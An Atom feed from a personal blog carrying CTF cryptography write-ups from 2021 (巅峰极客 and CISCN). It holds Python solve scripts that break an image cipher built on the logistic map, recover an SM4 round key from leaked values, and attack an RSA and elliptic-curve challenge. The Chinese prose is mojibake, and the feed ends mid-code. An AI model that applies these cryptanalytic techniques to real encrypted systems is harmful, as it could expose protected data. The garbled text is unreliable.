<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K1rit0&#39;s Blog</title>
  
  <subtitle>111111</subtitle>
  <link href="http://tearsjin.github.io/atom.xml" rel="self"/>
  
  <link href="http://tearsjin.github.io/"/>
  <updated>2021-07-31T10:05:54.944Z</updated>
  <id>http://tearsjin.github.io/</id>
  
  <author>
    <name>K1rit0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>writeup for 2021 å·…å³°æå®¢ Crypto</title>
    <link href="http://tearsjin.github.io/2021/07/31/writeup-for-2021-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
    <id>http://tearsjin.github.io/2021/07/31/writeup-for-2021-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</id>
    <published>2021-07-31T09:29:58.000Z</published>
    <updated>2021-07-31T10:05:54.944Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å•Šå¥½ä¹…æ²¡æ›´æ–°blogäº†, æ‰“äº†ä¸‹å·…å³°æå®¢, å†™ä¸€ä¸‹wpå§.</p><p>äºŒå…ƒcopperæ€äº†æˆ‘å§</p></blockquote><h1 id="MedicalImage"><a href="#MedicalImage" class="headerlink" title="MedicalImage"></a>MedicalImage</h1><p>ä¸€ä¸ªå›¾ç‰‡åŠ å¯†è„šæœ¬, å‡½æ•°<code>f(x)</code>è¢«éšè—äº†, ä½†ç»™äº†æç¤º, æ˜¯<code>logistic map</code>, (åœ¨bç«™çœ‹ä¸‹è§†é¢‘, æ•°å­¦çœŸçš„å¥½ç¥å¥‡å•Š).è€Œä¸”å‚æ•°$r$æ˜¯æœ€å¤§åˆæ³•å€¼, ä¹Ÿå°±æ˜¯$4$, é‚£ä¹ˆå‡½æ•°<code>f(x)</code>ä¸º<br>$$<br>f(x) = 4x(1-x)<br>$$<br>ç„¶åå°±æ˜¯å¯¹ç€åŠ å¯†æµç¨‹å†™è§£å¯†äº†â€¦.  æ²¡æœ‰å•¥ç‰¹åˆ«çš„ é€†ç€åŠ å¯†è¿‡ç¨‹å†™è§£å¯†å°±è¡Œ, p0,c0å°±é‚£å‡ ä¸ªå€¼çˆ†ç ´å°±è¡Œ, ä¸€å¼€å§‹éšä¾¿æ‹¿101,201è¯•äº†ä¸‹â€¦ç›´æ¥å¯¹äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">getcontext().prec = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R = Decimal(<span class="number">4</span>)</span><br><span class="line">r1 = Decimal(<span class="string">&#x27;0.478706063089473894123&#x27;</span>)</span><br><span class="line">r2 = Decimal(<span class="string">&#x27;0.613494245341234672318&#x27;</span>)</span><br><span class="line">r3 = Decimal(<span class="string">&#x27;0.946365754637812381837&#x27;</span>)</span><br><span class="line">const = <span class="number">10</span> ** <span class="number">14</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(</span><br><span class="line">    <span class="string">r&#x27;flag_enc.bmp&#x27;</span></span><br><span class="line">)</span><br><span class="line">size = im.size</span><br><span class="line">w,h = size</span><br><span class="line">im = np.array(im)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> Decimal(<span class="number">4</span> * x * (<span class="number">1</span> - x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    r1 = f(r1)</span><br><span class="line">    r2 = f(r2)</span><br><span class="line">    r3 = f(r3)</span><br><span class="line"></span><br><span class="line">S = time()</span><br><span class="line">p0 = <span class="number">101</span></span><br><span class="line">c0 = <span class="number">201</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        k = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r3))%<span class="number">256</span></span><br><span class="line">        k = <span class="built_in">bin</span>(k)[<span class="number">2</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        k = <span class="built_in">int</span>(k[p0%<span class="number">8</span>:]+k[:p0%<span class="number">8</span>],<span class="number">2</span>)</span><br><span class="line">        r3 = f(r3)</span><br><span class="line">        m0 = ((k ^ im[y,x] ^ c0 ) - k) % <span class="number">256</span></span><br><span class="line">        c0 = im[y,x]</span><br><span class="line">        p0 = m0</span><br><span class="line">        im[y,x] = m0</span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        x1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r1))%w</span><br><span class="line">        y1 = <span class="built_in">int</span>(<span class="built_in">round</span>(const*r2))%h</span><br><span class="line">        arr += [(x,y,x1,y1)]</span><br><span class="line">        r1 = f(r1)</span><br><span class="line">        r2 = f(r2)</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> arr[::-<span class="number">1</span>]:</span><br><span class="line">    x,y,x1,y1 = z</span><br><span class="line">    tmp = im[y,x]</span><br><span class="line">    im[y,x] = im[y1,x1]</span><br><span class="line">    im[y1,x1] = tmp  </span><br><span class="line">m = Image.new(<span class="string">&#x27;P&#x27;</span>, size,<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">pixels = m.load()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m.size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m.size[<span class="number">1</span>]):</span><br><span class="line">        pixels[i,j] = (<span class="built_in">int</span>(im[j][i]))</span><br><span class="line">m.save(<span class="string">r&#x27;flag.bmp&#x27;</span>)</span><br><span class="line">print(time()-S)</span><br></pre></td></tr></table></figure><h1 id="LearnSM4"><a href="#LearnSM4" class="headerlink" title="LearnSM4"></a>LearnSM4</h1><p>æœç„¶æ˜¯learnSM4, çœ‹äº†é¢˜ç›®é©¬ä¸Šè·‘å»å­¦SM4äº†, çœ‹äº†ä¸€ä¸‹åŠ å¯†è¿‡ç¨‹, ä¸éš¾</p><p>çœ‹é¢˜ç›®, è¦æ±‚åˆ©ç”¨ç»™å‡ºçš„åŠ å¯†è¿‡ç¨‹ä¸­çš„leakå¾—åˆ°è½®å¯†é’¥çš„ç¬¬ä¸€ä¸ª,ä¹Ÿå°±æ˜¯key[0]</p><p>æ¥çœ‹çœ‹ç¬¬ä¸€è½®åŠ å¯†çš„è¿‡ç¨‹<br>$$<br>X_4 = X_0 \oplus T(X_1 \oplus X_2 \oplus X_3 \oplus rk_0) \<br>T(X) = r(S(X))<br>$$<br>è¿™ä¸ª$rk_0$å°±æ˜¯æˆ‘ä»¬è¦æ±‚çš„, $T(x)$æ˜¯ä¸¤ä¸ªå˜æ¢åˆåœ¨ä¸€èµ·çš„, è‡ªå·±æ‰‹åŠ¨è¯•äº†ä¸€ä¸‹, å‘ç°$r(x)$å˜æ¢æ—¶å¯ä»¥ç”¨<code>z3</code>æ¢­å‡ºæ¥çš„, $S(x)$ç›´æ¥å°±èƒ½é€†å‡ºæ¥</p><p>è€Œä¸Šé¢çš„ç­‰å¼ä¸­$X_0,X_1,X_2,X_3$æ˜¯è‡ªå·±æ„é€ çš„, $X_4$èƒ½åˆ©ç”¨é¢˜ç›®ç»™çš„leakå¾—åˆ°, ä¼ <code>r=0,i=0~3</code>å³å¯</p><p>è¿™é‡Œæˆ‘ç›´æ¥ä¼ $X_0 = 1 , X_1,X_2,X_3 = 0$, å¯ä»¥æœ‰<br>$$<br>rk_0 = T^{-1}(X_4 \oplus 1 )<br>$$</p><p>è¿™å‡ å¤©å†™è¿œç¨‹çš„è„šæœ¬å†™åäº†, çœŸä¸æƒ³å†™, æ‰‹æ‰“äº†è¿™é¢˜, expåªæœ‰ä¸€æ­¥ä¸€æ­¥çš„ éƒ½æ˜¯æœ¬åœ°è·‘å‡ºç»“æœæ‰‹åŠ¨è¾“å…¥ä¸Šå»çš„, è®²ç©¶ç€çœ‹å§(æ‡’)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getnum</span>(<span class="params">arr</span>):</span></span><br><span class="line">    HEX = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">        HEX += <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(HEX,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨z3é€†Tå˜æ¢ä¸­çš„r(x)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">B</span>):</span></span><br><span class="line">    B1 = (((B &lt;&lt; <span class="number">2</span> ) &amp; <span class="number">0b1100000000000000000000000000000000</span>) &gt;&gt;<span class="number">32</span>) ^ (B &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B2 = (((B &lt;&lt; <span class="number">10</span>) &amp; <span class="number">0b111111111100000000000000000000000000000000</span>) &gt;&gt; <span class="number">32</span>) ^ (B&lt;&lt;<span class="number">10</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B3 = (((B &lt;&lt; <span class="number">18</span>) &amp; <span class="number">0b11111111111111111100000000000000000000000000000000</span>) &gt;&gt; <span class="number">32</span>) ^ (B&lt;&lt;<span class="number">18</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    B4 = (((B &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0b11111111111111111111111100000000000000000000000000000000</span>) &gt;&gt; <span class="number">32</span>) ^ (B&lt;&lt;<span class="number">24</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> B ^ B1 ^ B2 ^ B3 ^ B4</span><br><span class="line">    </span><br><span class="line">S = z3.Solver()</span><br><span class="line">x = z3.BitVec(<span class="string">&#x27;x&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">S.add((getnum([<span class="number">161</span>,<span class="number">203</span>,<span class="number">79</span>,<span class="number">94</span>])^<span class="number">1</span>)- f(x)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> S.check():</span><br><span class="line">    print(S.model())</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€†S(x)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findS</span>(<span class="params">value</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> S_BOX[i] == value:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        </span><br><span class="line">print(<span class="built_in">hex</span>(<span class="number">2217051833</span>)[<span class="number">2</span>:]) <span class="comment"># 2217051833 z3æ¢­å‡ºçš„ç»“æœ</span></span><br><span class="line"><span class="comment"># 0x842586b9</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">arr = [<span class="number">0x84</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0xb9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    key += <span class="built_in">hex</span>(findS(i))[<span class="number">2</span>:]</span><br><span class="line">print(<span class="built_in">int</span>(key,<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>æŠŠæœ€åå¾—åˆ°çš„keyå€¼å‘è¿‡å»å°±å¥½äº†, è¿™é‡Œéƒ½æ²¡ç”¨åˆ°ç»™çš„hint, ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯éé¢„æœŸ</p><h1 id="crtrsa"><a href="#crtrsa" class="headerlink" title="crtrsa"></a>crtrsa</h1><blockquote><p>äºŒå…ƒCopper, çœŸä¸ä¼š æˆ‘æ˜¯èœé€¼,</p><p>è¿™å‡ å¤©æŠŠpaperçœ‹ä¸€ä¸‹å§, äºŒå…ƒCopperä¹Ÿå’•äº†å¥½ä¹…äº†, çœ‹è¿™å‡ å¤©èƒ½ä¸èƒ½å­¦ä¼š</p></blockquote><p><a href="https://link.springer.com/content/pdf/10.1007%2F3-540-45708-9_16.pdf">https://link.springer.com/content/pdf/10.1007%2F3-540-45708-9_16.pdf</a>  paper </p><blockquote><p>è¿™åšå®¢å†™çš„è¶Šæ¥è¶Šæ‡’äº†å“ˆå“ˆ  æœ‰ä»€ä¹ˆä¸æ¸…æ¥šçš„qqæ‰¾æˆ‘å§ 3519728596</p><p>è¿™æ ·ä¹ŸæŒºå¥½ è®°å½•ä¸€ä¸‹è‡ªå·±åšè¿‡çš„å°±å¥½äº†â€¦  æˆ‘æ˜¯fw</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å•Šå¥½ä¹…æ²¡æ›´æ–°blogäº†, æ‰“äº†ä¸‹å·…å³°æå®¢, å†™ä¸€ä¸‹wpå§.&lt;/p&gt;
&lt;p&gt;äºŒå…ƒcopperæ€äº†æˆ‘å§&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;MedicalImage&quot;&gt;&lt;a href=&quot;#MedicalImage&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>writeup-for-2021-CISCN</title>
    <link href="http://tearsjin.github.io/2021/05/16/writeup-for-2021-CISCN/"/>
    <id>http://tearsjin.github.io/2021/05/16/writeup-for-2021-CISCN/</id>
    <published>2021-05-16T03:08:39.000Z</published>
    <updated>2021-05-18T07:49:35.789Z</updated>
    
    <content type="html"><![CDATA[<p>å›½èµ›åˆèµ›, ç¬¬ä¸€æ¬¡å‚åŠ å›½èµ›, é™¤äº†ç¬¬ä¸€é“æ¶å¿ƒçš„å¤å…¸, å…¶ä»–é¢˜ç›®è¿˜æ˜¯åšçš„æŒºæœ‰æ„æ€çš„<br>ä¸€å…±å…­é“é¢˜, å‡ºäº†å››é“é¢˜, å‰©ä¸‹ä¸€é“å¤å…¸(å‘•äº†), ä¸€é“AES<br>è¿˜å¯ä»¥å§, è®°å½•ä¸€ä¸‹, è™½ç„¶æœ‰äº›éƒ¨åˆ†ä»¥å‰åšè¿‡, ä½†è¿˜æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿çš„</p><h1 id="0x00-classic"><a href="#0x00-classic" class="headerlink" title="0x00 classic"></a>0x00 classic</h1><blockquote><p>æ»šäº†, ç­‰çœŸå¯†ç ğŸ‘´ğŸ‘´çš„wp,</p></blockquote><blockquote><p>2021 / 5 /18 çœ‹äº†åˆ«çš„çˆ·çˆ·åšå®¢, å¥½å®¶ä¼™å¥—å¨ƒçˆ†ç ´ ADFGX + å‡¯æ’’ +æ …æ (è¯è¯´æ˜¯ADFGXè¿™ä¸ªé¡ºåºå—)</p></blockquote><h1 id="0x01-move"><a href="#0x01-move" class="headerlink" title="0x01 move"></a>0x01 move</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>å•Šè¿™ï¼Œçœ‹åˆ°é¢˜ç›®é©¬ä¸Šå°±æƒ³èµ·åˆšç»“æŸä¸ä¹…çš„è™ç¬¦çš„simultaneousäº†ï¼Œå½“æ—¶é‚£é¢˜æ²¡è§£å‡ºæ¥æ¼ç«äº†å¥½ä¹…ã€‚è¿˜å¥½é‚£ä¸ªæ—¶å€™å†™wpå†™çš„å¤Ÿè¯¦ç»†äº†ï¼Œå›å»å†çœ‹ä¸€éåˆä»¿ä½›æ˜ç™½äº†ä¸€åˆ‡hhh</p><p><a href="https://tearsjin.xyz/2021/04/06/writeup-for-2021%E8%99%8E%E7%AC%A6/">ä¼ é€é—¨-&gt;</a></p><p>è·Ÿç€è™ç¬¦é‚£æ ·å°±èƒ½åˆ†è§£$n$äº†ï¼Œå¾—åˆ°äº†$pï¼Œq$ä¹‹åï¼Œå†çœ‹çœ‹åé¢çš„åŠ å¯†</p><p>çœ‹åˆ°<code>add() mul()</code>, ECCæ²¡é”™äº†ï¼Œå¸å–ä»¥å‰çš„æ•™è®­ï¼ŒåšECCå…ˆçœ‹å…³ç³»å¼æ˜¯æ€æ ·çš„ï¼Œä»åŠ æ³•çš„é‚£å‡ è¡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œç”¨çš„æ¤­åœ†æ›²çº¿å°±æ˜¯å¸¸ç”¨çš„é‚£ç§ï¼Œè€Œä¸”$a = 0$ï¼Œ æœ‰ä¸€ä¸ªç‚¹$E(c)$å¾ˆå®¹æ˜“å°±èƒ½ç®—å‡ºå‚æ•°$b$</p><p>é€šè¿‡åˆ†è§£å‡ºçš„$p$ï¼Œæˆ‘ä»¬å°±èƒ½é€ å‡ºæ›²çº¿$y^2 = x^3 + b \mod p$, é˜¶ä¸º$p + 1$ï¼Œæ¤­åœ†æ›²çº¿çš„ä¹˜æ³•å°±æ˜¯ä¸€ä¸ªç¯ï¼Œä¹˜å®Œä¸€ä¸ªé˜¶å°±è½¬å›æ¥äº†ï¼Œæ‰€ä»¥åªéœ€è¦æ±‚$d = e^{-1} \mod p+1$ å°±å¯ä»¥æœ‰$e \cdot d \cdot E(flag) = E(flag) $</p><p>æœ€åæŠŠç‚¹è½¬å›æ¥å°±å®Œäº‹äº†</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 